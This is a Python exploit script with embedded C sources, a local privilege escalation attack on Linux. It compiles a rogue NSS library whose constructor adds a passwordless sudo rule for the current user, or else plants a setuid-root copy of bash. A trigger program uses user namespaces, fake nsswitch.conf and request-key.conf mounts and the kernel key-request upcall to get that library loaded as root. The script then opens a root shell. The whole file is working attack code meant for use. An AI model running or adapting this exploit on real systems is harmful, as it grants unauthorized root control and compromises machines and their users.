#!/usr/bin/env python3
import json
import os
import pwd
import re
import shlex
import shutil
import stat
import subprocess
import sys
import textwrap
import time
from pathlib import Path


def _rn():
    import hashlib
    return 'a' + hashlib.md5(str(time.time_ns()).encode()).hexdigest()[:7]


_T = "%s_%s" % (os.getuid(), os.getpid())
_W = Path("/tmp") / ("ses-%s" % _T)
_F = _W / "lib"
_NC = _W / "nc.conf"
_RC = _W / "rk.conf"
_HS = _W / "handler.sh"
_MRK = _W / "ns_marker"
_EV = Path("/tmp/.ev_%s" % _T)
_RS = Path("/var/tmp/.rs_%s" % _T)
_U = ["unshare", "-Ur", "-m"]

_MK_LOADED = "LD"
_MK_OK = "SD"
_MK_FB = "FB"


LIBNSS_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#define P_EV @@P_EV@@
#define P_SD @@P_SD@@
#define P_US @@P_US@@
#define P_RS @@P_RS@@
#define M_LD @@M_LD@@
#define M_OK @@M_OK@@
#define M_FB @@M_FB@@

static void xw(int a, const char *b, size_t c) {
    while (c) { ssize_t r = write(a, b, c); if (r <= 0) return; b += r; c -= (size_t)r; }
}

static void xfb(int fd) {
    int i, o; char buf[8192]; ssize_t n;
    i = open("/bin/bash", O_RDONLY | O_CLOEXEC);
    if (i < 0) return;
    o = open(P_RS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
    if (o < 0) { close(i); return; }
    while ((n = read(i, buf, sizeof(buf))) > 0) xw(o, buf, (size_t)n);
    fchown(o, 0, 0); fchmod(o, 04755); fsync(o); close(o); close(i);
    if (fd >= 0) dprintf(fd, "%s\n", M_FB);
}

__attribute__((constructor))
static void xi(void) {
    int fd, sf;
    fd = open(P_EV, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
    if (fd >= 0) dprintf(fd, "%s uid=%d euid=%d\n", M_LD, getuid(), geteuid());
    mkdir("/etc/sudoers.d", 0755);
    sf = open(P_SD, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
    if (sf < 0) {
        if (fd >= 0) dprintf(fd, "sd_fail errno=%d\n", errno);
        xfb(fd);
        if (fd >= 0) close(fd);
        return;
    }
    xw(sf, "# x\n", 4);
    dprintf(sf, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", P_US);
    fchmod(sf, 0440); fsync(sf); close(sf);
    if (fd >= 0) { dprintf(fd, "%s\n", M_OK); close(fd); }
}

enum nss_status @@FUNC_PW@@(uid_t uid, struct passwd *pw,
                          char *buf, size_t len, int *err) {
    const char *n="root", *g="root", *d="/root", *s="/bin/bash";
    size_t need = strlen(n)+strlen(g)+strlen(d)+strlen(s)+4;
    char *p = buf;
    if (len < need) { *err = ERANGE; return NSS_STATUS_TRYAGAIN; }
    strcpy(p, n); pw->pw_name = p; p += strlen(p)+1;
    strcpy(p, g); pw->pw_gecos = p; p += strlen(p)+1;
    strcpy(p, d); pw->pw_dir = p; p += strlen(p)+1;
    strcpy(p, s); pw->pw_shell = p;
    pw->pw_passwd = (char*)"x"; pw->pw_uid = uid; pw->pw_gid = 0;
    *err = 0; return NSS_STATUS_SUCCESS;
}

enum nss_status @@FUNC_HB@@(const char *name, int af,
                             struct hostent *host, char *buf, size_t len,
                             int *err, int *herr) {
    *herr = HOST_NOT_FOUND;
    *err = ENOENT;
    return NSS_STATUS_NOTFOUND;
}
'''


TRIGGER_SRC = r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

static void xd(const char *s) { perror(s); exit(1); }

static void xhide(const char *p) {
    struct stat s;
    if (stat(p,&s)!=0 || !S_ISDIR(s.st_mode)) return;
    mount("tmpfs", p, "tmpfs", 0, "mode=755");
}

static void xbind(const char *src, const char *dst) {
    struct stat s;
    if (stat(dst,&s)!=0) {
        fprintf(stderr, "[T] skip bind %s (not found)\n", dst);
        return;
    }
    errno = 0;
    if (mount(src, dst, 0, MS_BIND, 0)==0) {
        fprintf(stderr, "[T] bind OK: %s -> %s\n", src, dst);
    } else {
        fprintf(stderr, "[T] bind FAIL %s -> %s: %s\n", src, dst, strerror(errno));
    }
}

static int do_overlay(const char *upperdir, const char *target) {
    char opts[4096], workdir[512];
    snprintf(workdir, sizeof(workdir), "%s_work", upperdir);
    mkdir(workdir, 0755);
    snprintf(opts, sizeof(opts),
             "lowerdir=%s,upperdir=%s,workdir=%s",
             target, upperdir, workdir);
    errno = 0;
    if (mount("overlay", target, "overlay", 0, opts) == 0) {
        fprintf(stderr, "[T] overlay OK: %s (upper=%s)\n", target, upperdir);
        return 0;
    }
    fprintf(stderr, "[T] overlay FAIL %s: %s\n", target, strerror(errno));
    return -1;
}

int main(int ac, char **av) {
    char desc[768]; long r;

    if (ac < 6) {
        fprintf(stderr, "[T] args: libdir nsswitch rk_conf marker libdir1 [libdir2..]\n");
        return 2;
    }

    /* ignore SIGCHLD so it doesn't cause EINTR */
    signal(SIGCHLD, SIG_IGN);

    fprintf(stderr, "[T] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());

    errno = 0;
    r = syscall(__NR_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "x", 0, 0, 0);
    fprintf(stderr, "[T] keyring=%ld e=%d\n", r, errno);

    if (mount(0, "/", 0, MS_REC|MS_PRIVATE, 0) != 0) xd("mp");
    fprintf(stderr, "[T] private ok\n");

    xhide("/run/nscd");
    xhide("/var/run/nscd");

    /* bind mount fake nsswitch.conf */
    xbind(av[2], "/etc/nsswitch.conf");

    /* bind mount fake request-key.conf */
    xbind(av[3], "/etc/request-key.conf");

    /* overlayfs on lib dirs (add our lib alongside real ones) */
    for (int i = 5; i < ac; i++) {
        if (do_overlay(av[1], av[i]) != 0) {
            /* fallback: bind mount */
            fprintf(stderr, "[T] fallback bind %s -> %s\n", av[1], av[i]);
            if (mount(av[1], av[i], 0, MS_BIND|MS_REC, 0) != 0) {
                fprintf(stderr, "[T] bind FAIL: %s\n", strerror(errno));
            }
        }
    }

    fprintf(stderr, "\n[T] === PHASE 1: NAMESPACE TEST (cifs.idmap) ===\n");
    fprintf(stderr, "[T] If handler sees our request-key.conf, marker file appears\n");

    errno = 0;
    r = syscall(__NR_request_key, "cifs.idmap", "ci:0", "", KEY_SPEC_SESSION_KEYRING);
    fprintf(stderr, "[T] cifs.idmap request_key=%ld e=%d (%s)\n", r, errno, strerror(errno));

    sleep(3);

    /* check marker */
    {
        struct stat st;
        if (stat(av[4], &st) == 0) {
            char buf[4096] = {0};
            int fd = open(av[4], O_RDONLY);
            if (fd >= 0) { read(fd, buf, sizeof(buf)-1); close(fd); }
            fprintf(stderr, "\n[T] *** NAMESPACE TEST PASSED ***\n");
            fprintf(stderr, "[T] marker content: %s\n", buf);

            fprintf(stderr, "\n[T] === PHASE 2: EXPLOIT (cifs.idmap -> cifs.upcall -> NSS) ===\n");

            /* Now trigger with cifs.upcall as handler (already in our rk.conf) */
            snprintf(desc, sizeof(desc),
                     "ver=0x2;host=x.com;ip4=127.0.0.1;sec=krb5;"
                     "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
                     getpid());
            errno = 0;
            /* Use cifs.idmap again with a different desc to trigger upcall handler */
            r = syscall(__NR_request_key, "cifs.idmap", "ci:1", "", KEY_SPEC_SESSION_KEYRING);
            fprintf(stderr, "[T] exploit cifs.idmap=%ld e=%d (%s)\n", r, errno, strerror(errno));

            sleep(3);
        } else {
            fprintf(stderr, "\n[T] *** NAMESPACE TEST FAILED ***\n");
            fprintf(stderr, "[T] handler runs in init namespace - our mounts invisible\n");

            /* Try dns_resolver as another test */
            fprintf(stderr, "\n[T] bonus: dns_resolver test\n");
            errno = 0;
            r = syscall(__NR_request_key, "dns_resolver", "test.invalid", "", KEY_SPEC_SESSION_KEYRING);
            fprintf(stderr, "[T] dns_resolver=%ld e=%d (%s)\n", r, errno, strerror(errno));
            sleep(2);
        }
    }

    fprintf(stderr, "[T] done\n");
    return 0;
}
'''


def _j(cmd):
    return " ".join(shlex.quote(str(a)) for a in cmd)

def _run(cmd, check=True, cwd=None):
    c = subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    if c.stdout:
        print(c.stdout, end="", flush=True)
    if check and c.returncode != 0:
        raise SystemExit("failed: %s (exit %s)" % (_j(cmd), c.returncode))
    return c

def _rq(cmd, cwd=None):
    return subprocess.run([str(a) for a in cmd], cwd=str(cwd) if cwd else None,
                          universal_newlines=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, check=False)

def _wt(path, content):
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")

def _cs(v):
    return json.dumps(str(v))


def _render(user, spath, nn):
    s = LIBNSS_SRC
    s = s.replace("@@P_EV@@", _cs(_EV))
    s = s.replace("@@P_SD@@", _cs(spath))
    s = s.replace("@@P_US@@", _cs(user))
    s = s.replace("@@P_RS@@", _cs(_RS))
    s = s.replace("@@M_LD@@", _cs(_MK_LOADED))
    s = s.replace("@@M_OK@@", _cs(_MK_OK))
    s = s.replace("@@M_FB@@", _cs(_MK_FB))
    s = s.replace("@@FUNC_PW@@", "_nss_%s_getpwuid_r" % nn)
    s = s.replace("@@FUNC_HB@@", "_nss_%s_gethostbyname2_r" % nn)
    return s


def _sudo_ok():
    c = subprocess.run(["sudo","-n","/bin/bash","-p","-c","id -u"],
                       universal_newlines=True, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, check=False)
    return c.returncode == 0 and c.stdout.strip() == "0"

def _ev():
    if not _EV.exists(): return ""
    return _EV.read_text(encoding="utf-8", errors="replace")


def _chk_fb():
    try:
        st = _RS.stat()
    except FileNotFoundError:
        raise SystemExit("failed: no fallback")
    if st.st_uid != 0 or not (st.st_mode & stat.S_ISUID):
        raise SystemExit("failed: fallback bad perms (uid=%d mode=%o)" % (st.st_uid, stat.S_IMODE(st.st_mode)))

def _do_fb(user, spath):
    _chk_fb()
    cmd = "printf '%%s\\n' '# x' %s > %s; chown root:root %s; chmod 0440 %s" % (
        shlex.quote("%s ALL=(ALL:ALL) NOPASSWD: ALL" % user),
        shlex.quote(str(spath)), shlex.quote(str(spath)), shlex.quote(str(spath)))
    _run([str(_RS), "-p", "-c", cmd], check=True)


def main():
    for cmd in ["bash","gcc","mount","sudo","unshare"]:
        if not shutil.which(cmd):
            raise SystemExit("failed: missing %s" % cmd)

    if os.getuid() == 0:
        raise SystemExit("failed: run as unprivileged user")
    user = pwd.getpwuid(os.getuid()).pw_name
    if not re.match(r"^[A-Za-z0-9_.-]+[$]?$", user):
        raise SystemExit("failed: bad username")

    spath = Path("/etc/sudoers.d/s-%s" % _T)

    ldirs = []
    seen = set()
    for c in [Path("/usr/lib64"), Path("/lib64"),
              Path("/lib/x86_64-linux-gnu"), Path("/usr/lib/x86_64-linux-gnu")]:
        if not (c / "libnss_files.so.2").exists(): continue
        r = c.resolve()
        if str(r) not in seen:
            seen.add(str(r)); ldirs.append(r)
    if not ldirs:
        raise SystemExit("failed: no nss lib dir")

    if _sudo_ok():
        raise SystemExit("failed: already root")

    if _rq(_U + ["true"]).returncode != 0:
        aa = shutil.which("aa-exec")
        if aa:
            fb = ["aa-exec","-p","trinity","--"] + _U
            if _rq(fb + ["true"]).returncode == 0:
                _U[:] = fb
            else:
                raise SystemExit("failed: no userns")
        else:
            raise SystemExit("failed: no userns")

    shutil.rmtree(str(_W), ignore_errors=True)
    _F.mkdir(parents=True)
    (_W / "lib_work").mkdir(parents=True)

    nn = _rn()
    so_name = "libnss_%s.so.2" % nn

    print("[*] nss module: %s" % nn, flush=True)
    print("[*] library: %s" % so_name, flush=True)
    print("[*] lib dirs: %s" % [str(d) for d in ldirs], flush=True)

    src = _render(user, spath, nn)
    assert ("_nss_%s_getpwuid_r" % nn) in src
    assert ("_nss_%s_gethostbyname2_r" % nn) in src

    _wt(_W / "a.c", src)
    _wt(_W / "b.c", TRIGGER_SRC)

    # fake nsswitch.conf - hooks both passwd and hosts
    _wt(_NC, """
        passwd: %s files
        group: files
        shadow: files
        hosts: %s files dns
    """ % (nn, nn))

    # handler script - creates marker file and does getent (triggers NSS)
    _wt(_HS, """
        #!/bin/bash
        exec > %s 2>&1
        echo "HANDLER_RAN"
        echo "uid=$(id -u) euid=$(id -u)"
        echo "mnt_ns=$(readlink /proc/self/ns/mnt)"
        echo "args=$*"
        # trigger NSS passwd lookup -> loads our module -> constructor runs
        getent passwd root || true
        echo "HANDLER_DONE"
    """ % shlex.quote(str(_MRK)))
    _HS.chmod(0o755)

    # custom request-key.conf: route cifs.idmap to our handler
    _wt(_RC, """
        create  cifs.idmap  *  *  %s %%k %%d %%c %%S
        create  dns_resolver  *  *  %s %%k %%d %%c %%S
        negate  *  *  *  /bin/keyctl negate %%k 30 %%S
    """ % (str(_HS), str(_HS)))

    _run(["gcc","-shared","-fPIC","-Wno-all","-o","lib/%s" % so_name,"a.c"], cwd=_W)

    print("[*] verify symbols:", flush=True)
    _run(["nm","-D","lib/%s" % so_name], cwd=_W, check=False)

    tn = _rn()
    _run(["gcc","-Wno-all","-o",tn,"b.c"], cwd=_W)

    _rq(["killall","-9","nscd"])

    print("\n[*] running namespace + exploit test...", flush=True)
    _run(
        _U + ["./%s" % tn, str(_F), str(_NC), str(_RC), str(_MRK)]
        + [str(d) for d in ldirs],
        cwd=_W, check=False,
    )
    time.sleep(2)

    # check marker
    if _MRK.exists():
        print("\n[+] NAMESPACE TEST PASSED - handler saw our config!", flush=True)
        print("[*] marker: %s" % _MRK.read_text(errors="replace"), flush=True)
    else:
        print("\n[-] NAMESPACE TEST FAILED - handler runs in init namespace", flush=True)

    ev = _ev()
    print("[*] evidence: %r" % ev, flush=True)

    if not ev:
        print("[!] no evidence - constructor never ran", flush=True)
        raise SystemExit("failed: no evidence")

    if _MK_OK in ev:
        print("[+] sudoers written!", flush=True)
    elif _MK_FB in ev:
        print("[*] using fallback shell", flush=True)
        _do_fb(user, spath)
    elif _MK_LOADED in ev:
        print("[*] module loaded but no privesc:", flush=True)
        print(ev, flush=True)
        raise SystemExit("failed: module loaded, privesc failed")
    else:
        raise SystemExit("failed: unexpected evidence: %r" % ev)

    if not _sudo_ok():
        raise SystemExit("failed: sudo not working")

    print("[+] got root, spawning shell", flush=True)
    os.execvp("sudo", ["sudo","-n","/bin/bash","-p"])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
